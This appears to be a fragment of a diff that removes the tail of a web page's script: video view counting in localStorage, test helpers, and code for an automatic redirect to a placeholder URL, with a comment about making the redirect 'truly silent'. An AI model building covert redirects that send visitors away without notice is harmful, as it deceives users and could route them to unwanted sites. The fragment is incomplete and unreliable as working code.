-                element.style.transform = `translate(${x}px, ${y}px)`;
-            });
-        });
-
-        // Function to add new video (you can call this to add more videos)
-        function addVideo(newVideo) {
-            videos.push(newVideo);
-            loadVideos();
-        }
-
-        // Function to reset all view counts (for testing)
-        function resetViewCounts() {
-            localStorage.removeItem('videoViews');
-            loadVideos();
-            console.log('All view counts have been reset!');
-        }
-
-        // Function to get total views across all videos
-        function getTotalViews() {
-            const viewCounts = JSON.parse(localStorage.getItem('videoViews') || '{}');
-            const total = Object.values(viewCounts).reduce((sum, count) => sum + count, 0);
-            console.log(`Total views across all videos: ${total}`);
-            return total;
-        }
-
-        // Function to manually trigger redirect (for testing)
-        function triggerRedirect() {
-            window.location.href = AUTO_REDIRECT_URL;
-        }
-
-        // Function to check redirect status (for debugging)
-        function checkRedirectStatus() {
-            const elapsed = Date.now() - redirectStartTime;
-            const remaining = Math.max(0, redirectDelay - elapsed);
-            console.log(`Redirect status: ${remaining}ms remaining, User clicked video: ${userClickedVideo}`);
-        }
-
-        // Remove the beforeunload event listener to make redirect truly silent
-        // No page refresh prevention
-    </script>
 </body>
 </html>
